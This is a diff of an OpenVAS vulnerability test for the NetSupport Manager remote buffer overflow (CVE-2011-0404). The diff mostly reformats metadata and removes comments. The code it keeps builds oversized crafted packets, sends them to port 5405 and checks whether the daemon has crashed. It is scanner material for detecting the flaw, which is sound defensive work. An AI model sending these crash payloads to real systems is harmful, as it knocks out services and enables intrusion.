@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_netsupport_manager_bof_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
+# $Id: gb_netsupport_manager_bof_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
 #
 # NetSupport Manager Remote Buffer Overflow Vulnerability
 #
@@ -24,40 +24,21 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_impact = "Successful exploitation will allow attacker to crash an affected
-daemon or execute arbitrary code.
-
-Impact Level: System/Application";
-
-tag_affected = "NetSupport Manager Agent 11.00 on Linux.";
-
-tag_insight = "The flaw is caused by a buffer overflow error when processing
-packets sent to port 5405/TCP, which could be exploited by remote unauthenticated
-attackers to crash an affected daemon or execute arbitrary code.";
-
-tag_solution = "No solution or patch was made available for at least one year
-since disclosure of this vulnerability. Likely none will be provided anymore.
-General solution options are to upgrade to a newer release, disable respective
-features, remove the product or replace the product by another one.";
-
-tag_summary = "The host is running NetSupport Manager and is prone to buffer
-  overflow vulnerability.";
-
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.801810");
-  script_version("$Revision: 9351 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
+  script_version("$Revision: 11997 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-01-20 07:52:11 +0100 (Thu, 20 Jan 2011)");
   script_cve_id("CVE-2011-0404");
   script_bugtraq_id(45728);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
   script_name("NetSupport Manager Remote Buffer Overflow Vulnerability");
-  script_xref(name : "URL" , value : "http://secunia.com/advisories/42794");
-  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15937");
-  script_xref(name : "URL" , value : "http://www.securitytracker.com/id?1024943");
-  script_xref(name : "URL" , value : "http://www.ikkisoft.com/stuff/netsupport_linux.txt");
+  script_xref(name:"URL", value:"http://secunia.com/advisories/42794");
+  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15937");
+  script_xref(name:"URL", value:"http://www.securitytracker.com/id?1024943");
+  script_xref(name:"URL", value:"http://www.ikkisoft.com/stuff/netsupport_linux.txt");
 
   script_tag(name:"qod_type", value:"remote_vul");
   script_category(ACT_DENIAL);
@@ -65,11 +46,17 @@ if(description)
   script_family("Buffer overflow");
   script_dependencies("find_service.nasl");
   script_require_ports(5405);
-  script_tag(name : "impact" , value : tag_impact);
-  script_tag(name : "affected" , value : tag_affected);
-  script_tag(name : "insight" , value : tag_insight);
-  script_tag(name : "solution" , value : tag_solution);
-  script_tag(name : "summary" , value : tag_summary);
+  script_tag(name:"impact", value:"Successful exploitation will allow attacker to crash an affected
+daemon or execute arbitrary code.");
+  script_tag(name:"affected", value:"NetSupport Manager Agent 11.00 on Linux.");
+  script_tag(name:"insight", value:"The flaw is caused by a buffer overflow error when processing
+packets sent to port 5405/TCP, which could be exploited by remote unauthenticated
+attackers to crash an affected daemon or execute arbitrary code.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"The host is running NetSupport Manager and is prone to buffer
+  overflow vulnerability.");
   script_tag(name:"solution_type", value:"WillNotFix");
   exit(0);
 }
@@ -81,7 +68,6 @@ if(!get_port_state(port)){
   exit(0);
 }
 
-## Build Exploit
 triggerA = raw_string(0x15,0x00,0x5a,0x00) +
            crap(data: raw_string(0x41), length: 1024) +
            raw_string(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
@@ -105,16 +91,13 @@ triggerD = raw_string(0x06,0x00,0x07,0x00,0x20,0x00,0x00,0x00,0x0e,0x00,0x32,
                       0x00,0x4e,0x00,0x02,0x00,0xac,0x00,0x04,0x00,0x7f,0x00,
                       0x00,0x00);
 
-## Open TCP Socket
 soc = open_sock_tcp(port);
 if(!soc) {
   exit(0);
 }
 
-## Get Banner
 banner = recv(socket:soc, length:100);
 
-## Confirm The Application
 if("localhost.local" >!< banner) {
   exit(0);
 }
@@ -133,7 +116,6 @@ send(socket: soc, data: triggerD);
 close(soc);
 sleep(5);
 
-## Check Port Status
 soc = open_sock_tcp(port);
 if(!soc){
   security_message(port:port);
